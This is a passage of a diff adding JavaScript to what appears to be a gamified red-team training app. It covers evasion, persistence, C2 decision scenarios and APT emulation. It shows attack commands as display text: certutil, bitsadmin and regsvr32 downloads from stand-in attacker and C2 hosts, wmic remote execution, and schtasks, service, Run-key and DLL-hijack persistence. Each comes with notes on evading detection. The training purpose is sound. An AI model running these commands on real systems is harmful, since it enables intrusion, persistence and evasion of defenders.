+function applyEvasion(technique) {
+  const results = {
+    obfuscate: { av: -35, edr: -10, msg: 'String obfuscation applied. Static signatures degraded.' },
+    encrypt: { av: -20, edr: -8, msg: 'Payload encrypted. AV scanning surface reduced.' },
+    lotl: { av: -55, edr: -20, msg: 'Living off the Land applied. Native binary used for execution.' },
+    pack: { av: -40, edr: -5, msg: 'Packed/compressed. File entropy changed, some AV bypassed.' }
+  };
+  const r = results[technique];
+  detectionScores.av = Math.max(2, detectionScores.av + r.av);
+  detectionScores.edr = Math.max(5, detectionScores.edr + r.edr);
+  
+  const avBar = document.getElementById('av-score-bar');
+  const edrBar = document.getElementById('edr-score-bar');
+  avBar.style.width = detectionScores.av + '%';
+  edrBar.style.width = detectionScores.edr + '%';
+  
+  const getColor = (v) => v > 70 ? 'red' : v > 40 ? 'amber' : 'green';
+  const getLabel = (v) => v > 70 ? 'HIGH RISK' : v > 40 ? 'MEDIUM' : 'LOW';
+  
+  avBar.className = 'progress-fill ' + getColor(detectionScores.av);
+  edrBar.className = 'progress-fill ' + getColor(detectionScores.edr);
+  document.getElementById('av-score-txt').textContent = getLabel(detectionScores.av);
+  document.getElementById('edr-score-txt').textContent = getLabel(detectionScores.edr);
+  
+  const resultDiv = document.getElementById('evasion-result');
+  resultDiv.style.display = 'block';
+  resultDiv.innerHTML = '<div class="success-banner">' + r.msg + '</div>';
+  awardXP(10);
+}
+
+function triggerEDRAlert(type) {
+  const alerts = {
+    mimikatz: [
+      '[EDR] ALERT: Process 3812 (svchost_fake.exe) opened LSASS handle',
+      '[EDR] Rule: LSASS Memory Read — Severity: CRITICAL',
+      '[EDR] Action: Process suspended. Analyst notified.',
+      '[EDR] Behavioral chain: injection -> LSASS access -> credential dump'
+    ],
+    powershell: [
+      '[EDR] ALERT: powershell.exe with -EncodedCommand + network access',
+      '[EDR] Rule: Suspicious PS Encoded + Network — Severity: HIGH',
+      '[EDR] Script block logging: ENABLED — recording execution',
+      '[EDR] Action: Alert queued for analyst review'
+    ],
+    lotl: [
+      '[EDR] NOTICE: certutil.exe downloading from external URL',
+      '[EDR] Rule: LotL Binary Network Download — Severity: MEDIUM',
+      '[EDR] File written: C:\\Users\\user\\AppData\\certutil_payload.exe',
+      '[EDR] Action: File quarantined pending analysis'
+    ]
+  };
+  alerts[type].forEach((line, i) => {
+    setTimeout(() => {
+      const cls = line.includes('CRITICAL') || line.includes('suspended') ? 't-error' :
+                  line.includes('HIGH') || line.includes('quarantined') ? 't-warn' : 't-output';
+      appendTerminalLine('edr-terminal', cls, line);
+    }, i * 400);
+  });
+  awardXP(5);
+}
+
+function showLotL(tool) {
+  const tools = {
+    certutil: { use: 'certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\\Windows\\Temp\\svc.exe', reason: 'Signed Microsoft binary. Whitelisted by most AV. Performs BITS-style download. Hard to block without breaking certificate functionality.' },
+    wmic: { use: 'wmic /node:TARGET process call create "powershell.exe -ep bypass -c payload"', reason: 'WMI is a core Windows management interface. Lateral movement via WMI is difficult to distinguish from admin operations. Leaves minimal log artifacts.' },
+    bitsadmin: { use: 'bitsadmin /transfer job /download /priority high http://c2.domain/stage2 C:\\stage2.exe', reason: 'Background Intelligent Transfer Service — designed for legitimate Windows updates. Traffic blends with OS update traffic on port 80/443.' },
+    regsvr32: { use: 'regsvr32 /s /n /u /i:http://c2.domain/payload.sct scrobj.dll', reason: 'Script Component (SCT) execution via regsvr32 bypasses application whitelisting. Traffic to C2 appears as script registration. No explicit download visible.' }
+  };
+  const t = tools[tool];
+  const detail = document.getElementById('lotl-detail');
+  detail.style.display = 'block';
+  detail.innerHTML = `
+    <div class="panel" style="border-color:var(--amber)">
+      <div class="text-xs text-cyan mb8">Command</div>
+      <div class="terminal" style="max-height:60px"><span class="terminal-line"><span class="t-warn">${t.use}</span></span></div>
+      <div class="text-xs text-cyan mt12 mb8">Why it works</div>
+      <div class="text-sm text-muted">${t.reason}</div>
+    </div>
+  `;
+  awardXP(5);
+}
+
+// =============================================
+// SECTION 4: CAMPAIGN
+// =============================================
+function runDeconflict() {
+  const term = document.getElementById('deconflict-result');
+  term.innerHTML = '';
+  const lines = [
+    ['t-output', 'Running deconfliction engine...'],
+    ['t-output', 'Parsing traffic logs...'],
+    ['t-warn', '[!] Foreign IP activity detected: 198.51.100.12'],
+    ['t-error', '[!] Behavior pattern: automated scanner/exploit kit'],
+    ['t-output', 'Correlation with threat feed...'],
+    ['t-error', '[!] IP matches known FIN7 infrastructure'],
+    ['t-warn', 'RECOMMENDATION: Pause operation. Notify client. Verify scope.']
+  ];
+  lines.forEach((l, i) => {
+    setTimeout(() => {
+      const span1 = document.createElement('span');
+      span1.className = 'terminal-line';
+      const span2 = document.createElement('span');
+      span2.className = l[0];
+      span2.textContent = l[1];
+      span1.appendChild(span2);
+      term.appendChild(span1);
+    }, i * 400);
+  });
+  awardXP(10);
+}
+
+// =============================================
+// SECTION 5: TEAM OPS
+// =============================================
+function selectRole(role) {
+  document.querySelectorAll('.role-card').forEach(c => c.classList.remove('selected'));
+  document.getElementById('role-' + role).classList.add('selected');
+  
+  const consoles = {
+    lead: {
+      title: 'TEAM LEAD CONSOLE',
+      content: `<div class="grid-3 gap8 mb12">
+        <button class="btn" onclick="showAlert('Campaign update broadcast to team','green')">BROADCAST UPDATE</button>
+        <button class="btn amber-btn" onclick="showAlert('Deconfliction check initiated','')">DECONFLICT CHECK</button>
+        <button class="btn red-btn" onclick="showAlert('ABORT signal sent to all operators','red')">ABORT MISSION</button>
+      </div>
+      <div class="text-xs text-dim">Team lead responsibilities: set objectives, approve target selection, manage deconfliction, review evidence, brief/debrief operators, coordinate with client POC.</div>`
+    },
+    operator: {
+      title: 'OPERATOR CONSOLE',
+      content: `<div class="terminal" style="max-height:120px">
+        <span class="terminal-line"><span class="t-prompt">OP// </span><span class="t-cmd">check-in --status active --target CORP-DC01</span></span>
+        <span class="terminal-line"><span class="t-success">[✓] Check-in acknowledged by lead</span></span>
+        <span class="terminal-line"><span class="t-output">[TASK] Enumerate AD groups on CORP-DC01</span></span>
+        <span class="terminal-line"><span class="t-output">[TASK] Screenshot domain admin session</span></span>
+        <span class="terminal-line"><span class="t-prompt">OP// </span><span class="cursor"></span></span>
+      </div>`
+    },
+    maldev: {
+      title: 'MALWARE DEV CONSOLE',
+      content: `<div class="grid-2 gap8 mb12">
+        <button class="btn" onclick="showAlert('Custom implant compiled with new evasion layer','green')">COMPILE IMPLANT</button>
+        <button class="btn" onclick="showAlert('Payload test against AV engines initiated','')">TEST PAYLOAD</button>
+      </div>
+      <div class="text-xs text-dim">Malware dev builds custom payloads to operator specifications: target OS, AV evasion requirements, persistence method, C2 protocol, kill-switch conditions.</div>`
+    },
+    infra: {
+      title: 'INFRA ADMIN CONSOLE',
+      content: `<div class="grid-2 gap8 mb12">
+        <button class="btn" onclick="maintAction('provision')">PROVISION NODE</button>
+        <button class="btn amber-btn" onclick="maintAction('rotate')">ROTATE IPs</button>
+      </div>
+      <div class="text-xs text-dim">Infra admin manages the full infrastructure lifecycle: VPS provisioning, redirector configuration, C2 server maintenance, certificate renewal, and burn/rebuild procedures.</div>`
+    }
+  };
+  
+  const c = consoles[role];
+  document.getElementById('role-console-title').textContent = c.title;
+  document.getElementById('role-console-content').innerHTML = c.content;
+  document.getElementById('role-console').style.display = 'block';
+  awardXP(10);
+}
+
+function maintAction(action) {
+  const msgs = {
+    replace: '[INFRA] Replacing REDIR-AP-2 with new node. Provisioning...',
+    rotate: '[INFRA] IP rotation initiated. BGP propagation 2-5 min.',
+    provision: '[INFRA] New VPS provisioned: DO-SIN-1. Configuring redirector...',
+    burn: '[INFRA] BURN AND REBUILD initiated. All nodes decommissioned. Rebuilding from scratch...'
+  };
+  appendTerminalLine('maint-terminal', action === 'burn' ? 't-error' : 't-output', msgs[action]);
+  awardXP(5);
+}
+
+// =============================================
+// SECTION 6: ACCESS MANAGEMENT
+// =============================================
+function showPersist(type) {
+  const mechanisms = {
+    schtask: {
+      cmd: 'schtasks /create /tn "WindowsUpdateHelper" /tr "C:\\Windows\\Temp\\agent.exe" /sc onlogon /ru SYSTEM',
+      chain: 'User logon → Task Scheduler → SYSTEM process created → C2 beacon established',
+      detect: 'MEDIUM — Scheduled tasks are common, but /ru SYSTEM on a non-Microsoft task is unusual'
+    },
+    service: {
+      cmd: 'sc create "WinHttpSvc" binpath= "C:\\Windows\\Temp\\svc.exe" start= auto',
+      chain: 'System boot → Service Control Manager → svc.exe starts → C2 callback',
+      detect: 'HIGH — New service creation is heavily monitored by EDR. Name should mimic legitimate service.'
+    },
+    registry: {
+      cmd: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "OneDriveHelper" /t REG_SZ /d "C:\\agent.exe"',
+      chain: 'User logon → Registry Run key evaluated → agent.exe executes → C2 beacon',
+      detect: 'MEDIUM — Run keys are monitored but user-context keys are noisy. HKLM keys draw more attention.'
+    },
+    wmi: {
+      cmd: 'Register-WMIEvent -EventQuery "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'" ...',
+      chain: 'WMI event fires every 60s → EventConsumer executes → Payload runs → C2 callback',
+      detect: 'LOW — WMI subscriptions are rarely audited. Very stealthy. Hard to attribute to specific process.'
+    },
+    dll: {
+      cmd: '// Copy malicious DLL to application\'s search path directory\ncopy payload.dll "C:\\Program Files\\App\\version.dll"',
+      chain: 'Application start → Windows DLL search path → Hijacked DLL loads → C2 beacon',
+      detect: 'LOW — DLL loads from application directories appear legitimate. Requires static analysis to detect.'
+    }
+  };
+  const m = mechanisms[type];
+  document.getElementById('persist-detail').innerHTML = `
+    <div class="panel" style="border-color:var(--purple)">
+      <div class="text-xs text-cyan mb8">Command</div>
+      <div class="terminal" style="max-height:80px;margin-bottom:8px"><span class="terminal-line"><span class="t-warn">${m.cmd}</span></span></div>
+      <div class="text-xs text-cyan mb4">Execution Chain</div>
+      <div class="text-xs text-muted mb8">${m.chain}</div>
+      <div class="text-xs text-cyan mb4">Detection Risk</div>
+      <div class="text-xs text-amber">${m.detect}</div>
+    </div>`;
+  awardXP(5);
+}
+
+function addEvidence() {
+  const cmd = document.getElementById('ev-cmd').value;
+  const output = document.getElementById('ev-output').value;
+  const system = document.getElementById('ev-system').value;
+  if (!cmd) return;
+  
+  const hash = 'SHA256: ' + Math.random().toString(36).substr(2, 8) + Math.random().toString(36).substr(2, 8) + '...';
+  const log = document.getElementById('evidence-log');
+  const item = document.createElement('div');
+  item.className = 'evidence-item';
+  item.innerHTML = `
+    <div style="flex:1">
+      <div class="text-sm text-cyan">${cmd}</div>
+      <div class="text-xs text-dim mt2">${output || 'No output'} — ${system || 'Unknown system'}</div>
+      <div class="evidence-hash mt2">${hash}</div>
+    </div>
+    <span class="tag green">LOGGED</span>`;
+  log.insertBefore(item, log.firstChild);
+  
+  document.getElementById('ev-cmd').value = '';
+  document.getElementById('ev-output').value = '';
+  document.getElementById('ev-system').value = '';
+  showAlert('Evidence logged with hash chain.', 'green');
+  awardXP(10);
+}
+
+function runHashVerification() {
+  showAlert('Hash verification complete. All 6 evidence items: VERIFIED. Chain of custody: INTACT.', 'green');
+  awardXP(10);
+}
+
+function buildNarrative(type) {
+  const narratives = {
+    phishing: [
+      '[NARRATIVE] Campaign: Operation DARKFALL — Initial Access Chain',
+      '[T-0] Attacker crafted spear-phishing email targeting finance@corp.com',
+      '[T+2h] Target opened weaponized Excel document (CVE-2023-XXXX)',
+      '[T+2h] Macro executed PowerShell stager via WMIC',
+      '[T+2h] Stager downloaded second stage from cloud.domain.com/cdn.png',
+      '[T+2h] Second stage established C2 beacon to redirector-EU (HTTPS/443)',
+      '[T+2h] Initial foothold: workstation WS-FIN-012, user: j.smith',
+      '[NARRATIVE] Initial access chain complete. Attacker now has domain user access.'
+    ],
+    lateral: [
+      '[NARRATIVE] Lateral Movement Chain — CORP Domain',
+      '[T+0] WS-FIN-012 → PassTheHash to WS-ADMIN-004 (j.smith is local admin)',
+      '[T+15m] WS-ADMIN-004 → Network share access to FILESERVER01',
+      '[T+22m] Discovered admin credentials in \\\\FILESERVER01\\scripts\\deploy.ps1',
+      '[T+28m] Used credentials to authenticate to CORP-DC01 over WMI',
+      '[T+28m] Domain Admin access established on primary domain controller',
+      '[NARRATIVE] Domain compromise achieved in 28 minutes from initial foothold.'
+    ],
+    privesc: [
+      '[NARRATIVE] Privilege Escalation Chain',
+      '[T+0] Initial access: local user context on WS-FIN-012',
+      '[T+5m] Enumerated unquoted service paths: VulnerableSvc → SYSTEM',
+      '[T+7m] Dropped payload to C:\\Program Files\\Vuln Company\\payload.exe',
+      '[T+9m] Service restart triggered (periodic maintenance window)',
+      '[T+9m] SYSTEM shell established on WS-FIN-012',
+      '[T+12m] Token impersonation → CORP Domain Admin via Kerberoasting',
+      '[NARRATIVE] Full domain compromise via local privesc → kerberoast chain.'
+    ]
+  };
+  
+  const term = document.getElementById('narrative-output');
+  term.innerHTML = '';
+  narratives[type].forEach((line, i) => {
+    setTimeout(() => {
+      const span1 = document.createElement('span');
+      span1.className = 'terminal-line';
+      const span2 = document.createElement('span');
+      span2.className = line.includes('[NARRATIVE]') ? 't-success' : line.includes('[T+') ? 't-output' : 't-warn';
+      span2.textContent = line;
+      span1.appendChild(span2);
+      term.appendChild(span1);
+      term.scrollTop = term.scrollHeight;
+    }, i * 300);
+  });
+  awardXP(15);
+}
+
+// =============================================
+// SECTION 7: DECISIONS
+// =============================================
+function activateOODA(phase) {
+  document.querySelectorAll('.ooda-phase').forEach(p => p.classList.remove('active-phase'));
+  document.getElementById('ooda-' + phase).classList.add('active-phase');
+  
+  const content = {
+    O1: { title: 'OBSERVE', body: 'Gather raw information from the environment. Scan logs, monitor C2 callbacks, observe target behavior, watch for defender responses. Do not interpret yet — only collect. Key questions: What changed? What\'s happening right now?' },
+    O2: { title: 'ORIENT', body: 'Analyze and contextualize observations. Filter noise, identify patterns, apply operational experience. This is the most critical phase — your orientation shapes what you decide and how fast you can act. Bias is the enemy here.' },
+    D: { title: 'DECIDE', body: 'Select a course of action from the options your orientation presented. Speed matters — a slower decision cycle means the defender can react faster than you. Have pre-planned response options ready. Don\'t freeze.' },
+    A: { title: 'ACT', body: 'Execute the decision. Act with commitment. Indecisive half-measures are worse than either acting fully or not acting at all. After acting, immediately re-enter the Observe phase — the loop never stops.' }
+  };
+  
+  const c = content[phase];
+  const detail = document.getElementById('ooda-detail');
+  detail.style.display = 'block';
+  detail.querySelector('#ooda-detail-content').innerHTML = `
+    <div class="text-xs text-cyan mb8">${c.title}</div>
+    <div class="text-sm text-muted">${c.body}</div>`;
+  awardXP(5);
+}
+
+const scenarios = {
+  'blocked-port': {
+    alert: 'ALERT: Outbound port 443 blocked by new firewall rule. C2 beacons failing.',
+    text: 'Your primary C2 channel (HTTPS/443) has been blocked. Beacons are timing out. You have 3 active sessions that will die if not addressed.',
+    context: 'The block appears to be a new egress rule — likely triggered by anomalous traffic volume. Time since last beacon: 7 minutes.',
+    options: [
+      { text: 'A) Pivot C2 to DNS over port 53 — less suspicious than creating new HTTPS connections', correct: true },
+      { text: 'B) Try port 8443 immediately — maybe the rule doesn\'t apply to non-standard HTTPS', correct: false },
+      { text: 'C) Abandon current sessions and re-establish from a new entry point', correct: false },
+      { text: 'D) Do nothing — wait for the firewall rule to expire overnight', correct: false }
+    ],
+    result: 'CORRECT: DNS-based C2 is a proven fallback. DNS traffic on port 53 is rarely blocked outright. Pivoting to DNS maintains operational continuity with minimal detection risk.'
+  },
+  'payload-fail': {
+    alert: 'ALERT: Second stage payload execution failure on CORP-WS-114. AV quarantine event.',
+    text: 'Your payload was detected and quarantined on the target workstation. The AV logged the event. Security team may have visibility.',
+    context: 'Defender Antivirus Enterprise triggered on SHA256 match. This is a static signature hit — behavioral detection was not triggered.',
+    options: [
+      { text: 'A) Recompile payload with new obfuscation immediately and resend', correct: false },
+      { text: 'B) Pause, assess blast radius — how much did the AV alert reveal? Then rebuild payload architecture', correct: true },
+      { text: 'C) Escalate to different target — CORP-WS-114 is burned', correct: false },
+      { text: 'D) Use a different delivery mechanism (USB drop, physical access)', correct: false }
+    ],
+    result: 'CORRECT: Before acting, assess damage. The AV alert may have triggered an IR investigation. Understand what was exposed before burning more resources. Only then rebuild with improved evasion.'
+  },
+  'defender-response': {
+    alert: 'ALERT: Blue team activity detected. SOC analyst querying your C2 domain in threat intel feeds.',
+    text: 'Your C2 domain has been queried in VirusTotal by an IP tracing back to the target organization\'s SOC. They know something.',
+    context: 'Query occurred 14 minutes ago. No block has been applied yet. C2 beacons still succeeding. Window before action may be closing.',
+    options: [
+      { text: 'A) Immediately rotate to backup C2 infrastructure before they act', correct: true },
+      { text: 'B) Increase beacon frequency to get as much done as possible before eviction', correct: false },
+      { text: 'C) Maintain current pace — the SOC may just be doing routine threat intel', correct: false },
+      { text: 'D) Establish additional persistence mechanisms to survive the block', correct: false }
+    ],
+    result: 'CORRECT: The moment you know the defender is aware of your infrastructure, rotate. Increasing activity is the worst move — it confirms their intel. Rotating buys operational continuity before the block hits.'
+  },
+  'lost-access': {
+    alert: 'CRITICAL: ALL SESSIONS LOST — password rotation event across domain. Account lockout triggered.',
+    text: 'A domain-wide password rotation event has expired all your Kerberos tickets. All active sessions terminated. Your persistence mechanisms used domain credentials — all are dead.',
+    context: 'Suspected detection event. IR team may be active. All credential-based persistence is now non-functional.',
+    options: [
+      { text: 'A) Begin immediate fresh access attempt using a different vector', correct: false },
+      { text: 'B) Assess: do you have any credential-independent persistence (DLL hijack, scheduled task with local creds)?', correct: true },
+      { text: 'C) Notify team lead immediately, pause operations, conduct IR awareness assessment', correct: true },
+      { text: 'D) Attempt to spray new credentials — they might have missed some accounts', correct: false }
+    ],
+    result: 'CORRECT: Notify lead (coordination) and assess non-credential persistence (tactical). Never spray credentials after a suspected detection — it\'s loud and confirms active IR. Check if your architecture has credential-independent footholds.'
+  }
+};
+
+function loadScenario(type) {
+  const s = scenarios[type];
+  document.getElementById('scenario-alert').textContent = s.alert;
+  document.getElementById('scenario-text').textContent = s.text;
+  document.getElementById('scenario-context').textContent = 'Context: ' + s.context;
+  
+  const optDiv = document.getElementById('scenario-options');
+  optDiv.innerHTML = '';
+  s.options.forEach((opt, i) => {
+    const btn = document.createElement('button');
+    btn.className = 'option-btn';
+    btn.textContent = opt.text;
+    btn.onclick = () => checkScenarioAnswer(opt.correct, s.result);
+    optDiv.appendChild(btn);
+  });
+  
+  document.getElementById('scenario-display').style.display = 'block';
+  document.getElementById('scenario-result').style.display = 'none';
+  awardXP(5);
+}
+
+function checkScenarioAnswer(isCorrect, resultText) {
+  const result = document.getElementById('scenario-result');
+  result.style.display = 'block';
+  result.className = 'panel';
+  result.style.borderColor = isCorrect ? 'var(--green)' : 'var(--red)';
+  result.innerHTML = `
+    <div class="text-xs ${isCorrect ? 'text-green' : 'text-red'} mb8">${isCorrect ? '✓ CORRECT ASSESSMENT' : '✗ SUBOPTIMAL DECISION'}</div>
+    <div class="text-sm text-muted">${resultText}</div>`;
+  if (isCorrect) awardXP(20);
+}
+
+// =============================================
+// SECTION 9: ADVERSARY EMULATION
+// =============================================
+const threatProfiles = {
+  apt29: {
+    name: 'APT29 / COZY BEAR',
+    ttps: [
+      'Spear-phishing with NOBELIUM techniques',
+      'Supply chain compromise via trusted software',
+      'Long-dwell time — months before objective',
+      'WellMess, PolyglotDuke custom malware family',
+      'Domain fronting via legitimate CDN providers',
+      'Living off the land (PowerShell, WMI, certutil)',
+    ],
+    scores: { ttp: 87, infra: 72, behavior: 91 }
+  },
+  fin7: {
+    name: 'FIN7 / CARBANAK',
+    ttps: [
+      'Highly targeted phishing with custom lures',
+      'CARBANAK malware framework deployment',
+      'GRIFFON JavaScript backdoor — initial stage',
+      'POS system targeting via lateral movement',
+      'Manual keyboard operations — slow and careful',
+      'Finance/hospitality sector specialization',
+    ],
+    scores: { ttp: 79, infra: 68, behavior: 83 }
+  },
+  lazarus: {
+    name: 'LAZARUS GROUP (APT38)',
+    ttps: [
+      'HIDDEN COBRA custom malware ecosystem',
+      'LinkedIn / social engineering via fake recruiters',
+      'ELECTRICFISH tunneling tool for exfil',
+      'Cryptocurrency exchange targeting',
+      'Destructive malware as cover (BLINDINGCAN)',
+      'Extensive use of wiper malware post-objective',
+    ],
+    scores: { ttp: 91, infra: 88, behavior: 76 }
+  }
+};
+
+function selectThreat(type) {
+  document.querySelectorAll('.threat-card').forEach(c => c.classList.remove('selected'));
+  document.getElementById('threat-' + type).classList.add('selected');
+  
+  const p = threatProfiles[type];
+  document.getElementById('threat-profile-name').textContent = p.name;
+  document.getElementById('threat-ttp-list').innerHTML = p.ttps.map(t =>
+    `<div class="flex items-center gap8 mb6"><span class="text-red" style="font-size:10px">▸</span><span class="text-xs text-muted">${t}</span></div>`
+  ).join('');
+  
+  // Animate meter bars
+  setTimeout(() => {
+    document.getElementById('ttp-bar').style.width = p.scores.ttp + '%';
+    document.getElementById('ttp-accuracy').textContent = p.scores.ttp + '%';
+    document.getElementById('infra-bar').style.width = p.scores.infra + '%';
+    document.getElementById('infra-accuracy').textContent = p.scores.infra + '%';
+    document.getElementById('behavior-bar').style.width = p.scores.behavior + '%';
+    document.getElementById('behavior-accuracy').textContent = p.scores.behavior + '%';
+  }, 200);
+  
+  document.getElementById('threat-profile-detail').style.display = 'block';
+  awardXP(10);
+}
+
+function runEmulation() {
+  showAlert('Adversary emulation sequence initiated. Simulating TTPs...', 'amber');
+  awardXP(20);
+}
+
+function runCampaignPhase(phase) {
+  const outputs = {
+    plan: [
+      '[CAMPAIGN] Phase 1: Planning initiated',
+      '[CAMPAIGN] Target: Financial services firm — 4,500 employees',
+      '[CAMPAIGN] Threat actor: APT29 emulation',
+      '[CAMPAIGN] Attack vector: Supply chain + spear-phishing',
+      '[CAMPAIGN] Duration: 4-week window authorized',
+      '[CAMPAIGN] Planning phase complete. ✓'
+    ],
+    infra: [
+      '[INFRA] Provisioning Phase 2: Infrastructure build',
+      '[INFRA] C2 domain registered via privacy-preserving registrar',
+      '[INFRA] 2x redirectors deployed: EU-West, US-East',
+      '[INFRA] TLS certificates provisioned via LE',
+      '[INFRA] Domain categorization: "Technology News"',
+      '[INFRA] Infrastructure phase complete. ✓'
+    ],
+    exec: [
+      '[EXEC] Phase 3: Campaign execution',
+      '[EXEC] Spear-phishing lure crafted — vendor invoice theme',
+      '[EXEC] 14 targets identified in finance department',
+      '[EXEC] Payload: custom implant with NOBELIUM-style stager',
+      '[EXEC] 3 of 14 targets opened attachment',
+      '[EXEC] 1 successful compromise: j.sullivan@target.corp ✓'
+    ],
+    evade: [
+      '[EVADE] Phase 4: Evasion and persistence',
+      '[EVADE] Defender AV: Bypassed via obfuscated stager',
+      '[EVADE] EDR: Hollowed process — appears as svchost.exe',
+      '[EVADE] Persistence: WMI event subscription established',
+      '[EVADE] C2 traffic: Blended into normal HTTPS/CDN flow',
+      '[EVADE] Evasion phase complete. Dwell time: 14 days ✓'
+    ],
+    report: [
+      '[REPORT] Generating final adversary emulation report...',
+      '[REPORT] Attack path: Phishing → Initial Access → Lateral Movement',
+      '[REPORT] Objectives achieved: Domain Admin access, 2 of 3 targets',
+      '[REPORT] MITRE ATT&CK mapping: T1566.001, T1059.001, T1078, T1021',
+      '[REPORT] Detection gaps identified: 3 critical, 7 high, 12 medium',
+      '[REPORT] Report ready for client delivery. ✓',
+      '[REPORT] MISSION COMPLETE. ALL PHASES SUCCESSFUL.'
+    ]
+  };
+  
+  const output = outputs[phase];
+  const div = document.getElementById('campaign-sim-output');
+  div.style.display = 'block';
+  div.innerHTML = '';
+  output.forEach((line, i) => {
+    setTimeout(() => {
+      const span1 = document.createElement('span');
+      span1.className = 'terminal-line';
+      const span2 = document.createElement('span');
+      span2.className = line.includes('✓') ? 't-success' : line.includes('COMPLETE') ? 't-success' : 't-output';
+      span2.textContent = line;
+      span1.appendChild(span2);
+      div.appendChild(span1);
+      div.scrollTop = div.scrollHeight;
+    }, i * 350);
+  });
+  
+  // highlight active phase card
+  document.querySelectorAll('#campaign-sim-phases .ooda-phase').forEach(p => p.classList.remove('active-phase'));
+  const phaseId = 'csim-' + phase;
+  const el = document.getElementById(phaseId);
+  if (el) el.classList.add('active-phase');
+  awardXP(15);
+}
+
+// =============================================
+// UTILITIES
+// =============================================
+function appendTerminalLine(termId, cls, text) {
+  const term = document.getElementById(termId);
+  if (!term) return;
+  // Remove old cursor
+  const cursor = term.querySelector('.cursor');
+  const cursorLine = cursor && cursor.closest('.terminal-line');
+  
+  const span1 = document.createElement('span');
+  span1.className = 'terminal-line';
+  const span2 = document.createElement('span');
+  span2.className = cls;
+  span2.textContent = text;
+  span1.appendChild(span2);
+  
+  if (cursorLine) {
+    term.insertBefore(span1, cursorLine);
+  } else {
+    term.appendChild(span1);
+  }
+  term.scrollTop = term.scrollHeight;
+}
+
+// Initialize heatmap on load
+document.addEventListener('DOMContentLoaded', () => {
+  drawTimingHeatmap();
+  
+  // Animate XP bar on first load
+  setTimeout(() => {
+    document.getElementById('mission-dot').style.background = 'var(--green)';
+  }, 500);
+});
+
+// Redraw heatmap when section 1 shown
+const origShowSection = window.showSection;
+</script>
+</body>
+</html>
